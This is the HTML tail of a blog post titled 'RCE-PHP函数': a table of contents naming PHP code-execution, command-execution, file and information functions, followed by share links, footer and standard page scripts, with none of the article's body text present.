+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0"><span class="toc-number">1.</span> <span class="toc-text">代码执行函数</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.1.</span> <span class="toc-text">${}</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#eval"><span class="toc-number">1.2.</span> <span class="toc-text">eval()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#assert"><span class="toc-number">1.3.</span> <span class="toc-text">assert()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%87%BD%E6%95%B0%E5%8F%82%E6%95%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="toc-number">1.4.</span> <span class="toc-text">函数参数代码执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%87%BD%E6%95%B0%E5%A4%84%E7%90%86%E5%87%BD%E6%95%B0"><span class="toc-number">1.5.</span> <span class="toc-text">函数处理函数</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#call-user-func"><span class="toc-number">1.5.1.</span> <span class="toc-text">call_user_func()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#call-user-func-array"><span class="toc-number">1.5.2.</span> <span class="toc-text">call_user_func_array</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#create-function"><span class="toc-number">1.5.3.</span> <span class="toc-text">create_function()</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E7%BB%84%E5%87%BD%E6%95%B0"><span class="toc-number">1.6.</span> <span class="toc-text">数组函数</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#array-map"><span class="toc-number">1.6.1.</span> <span class="toc-text">array_map()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#usort"><span class="toc-number">1.6.2.</span> <span class="toc-text">usort()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#uasort"><span class="toc-number">1.6.3.</span> <span class="toc-text">uasort()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#uksort"><span class="toc-number">1.6.4.</span> <span class="toc-text">uksort()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#array-filter"><span class="toc-number">1.6.5.</span> <span class="toc-text">array_filter()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#array-reduce"><span class="toc-number">1.6.6.</span> <span class="toc-text">array_reduce()</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#preg-replace"><span class="toc-number">1.7.</span> <span class="toc-text">preg_replace()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ob-start"><span class="toc-number">1.8.</span> <span class="toc-text">ob_start()</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0"><span class="toc-number">2.</span> <span class="toc-text">命令执行函数</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#system"><span class="toc-number">2.1.</span> <span class="toc-text">system()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#passthru"><span class="toc-number">2.2.</span> <span class="toc-text">passthru()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#shell-exec"><span class="toc-number">2.3.</span> <span class="toc-text">shell_exec()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exec"><span class="toc-number">2.4.</span> <span class="toc-text">exec()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pcntl-exec"><span class="toc-number">2.5.</span> <span class="toc-text">pcntl_exec()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#popen"><span class="toc-number">2.6.</span> <span class="toc-text">popen()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#proc-open"><span class="toc-number">2.7.</span> <span class="toc-text">proc_open()</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E7%9B%B8%E5%85%B3%E6%89%A9%E5%B1%95"><span class="toc-number">3.</span> <span class="toc-text">文件系统相关扩展</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E5%87%BD%E6%95%B0"><span class="toc-number">3.1.</span> <span class="toc-text">目录函数</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#chdir"><span class="toc-number">3.1.1.</span> <span class="toc-text">chdir()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#scandir"><span class="toc-number">3.1.2.</span> <span class="toc-text">scandir()</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%BB%E5%86%99%E6%96%87%E4%BB%B6%E5%87%BD%E6%95%B0"><span class="toc-number">3.2.</span> <span class="toc-text">读写文件函数</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#file"><span class="toc-number">3.2.1.</span> <span class="toc-text">file()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#file-get-contents"><span class="toc-number">3.2.2.</span> <span class="toc-text">file_get_contents()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#file-put-contents"><span class="toc-number">3.2.3.</span> <span class="toc-text">file_put_contents()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#readfile"><span class="toc-number">3.2.4.</span> <span class="toc-text">readfile()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#readgzfile"><span class="toc-number">3.2.5.</span> <span class="toc-text">readgzfile()</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E5%87%BD%E6%95%B0"><span class="toc-number">4.</span> <span class="toc-text">敏感信息函数</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#phpinfo"><span class="toc-number">4.1.</span> <span class="toc-text">phpinfo()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#getenv"><span class="toc-number">4.2.</span> <span class="toc-text">getenv()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#getcwd"><span class="toc-number">4.3.</span> <span class="toc-text">getcwd()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#phpversion"><span class="toc-number">4.4.</span> <span class="toc-text">phpversion()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#get-loaded-extensions"><span class="toc-number">4.5.</span> <span class="toc-text">get_loaded_extensions()</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0"><span class="toc-number">5.</span> <span class="toc-text">环境变量相关函数</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#putenv"><span class="toc-number">5.1.</span> <span class="toc-text">putenv()</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#php%E4%B8%8D%E9%9C%80%E8%A6%81%E6%8B%AC%E5%8F%B7%E7%9A%84%E6%95%8F%E6%84%9F%E5%87%BD%E6%95%B0-%E5%85%B3%E9%94%AE%E5%AD%97"><span class="toc-number">6.</span> <span class="toc-text">php不需要括号的敏感函数&#x2F;关键字</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2026/01/28/RCE-PHP%E5%87%BD%E6%95%B0/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2026/01/28/RCE-PHP%E5%87%BD%E6%95%B0/&text=RCE-PHP函数"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2026/01/28/RCE-PHP%E5%87%BD%E6%95%B0/&title=RCE-PHP函数"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2026/01/28/RCE-PHP%E5%87%BD%E6%95%B0/&is_video=false&description=RCE-PHP函数"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=RCE-PHP函数&body=Check out this article: http://example.com/2026/01/28/RCE-PHP%E5%87%BD%E6%95%B0/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2026/01/28/RCE-PHP%E5%87%BD%E6%95%B0/&title=RCE-PHP函数"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2026/01/28/RCE-PHP%E5%87%BD%E6%95%B0/&title=RCE-PHP函数"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2026/01/28/RCE-PHP%E5%87%BD%E6%95%B0/&title=RCE-PHP函数"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2026/01/28/RCE-PHP%E5%87%BD%E6%95%B0/&title=RCE-PHP函数"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2026/01/28/RCE-PHP%E5%87%BD%E6%95%B0/&name=RCE-PHP函数&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2026/01/28/RCE-PHP%E5%87%BD%E6%95%B0/&t=RCE-PHP函数"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2026
+    John Doe
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/lierbushiwo">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
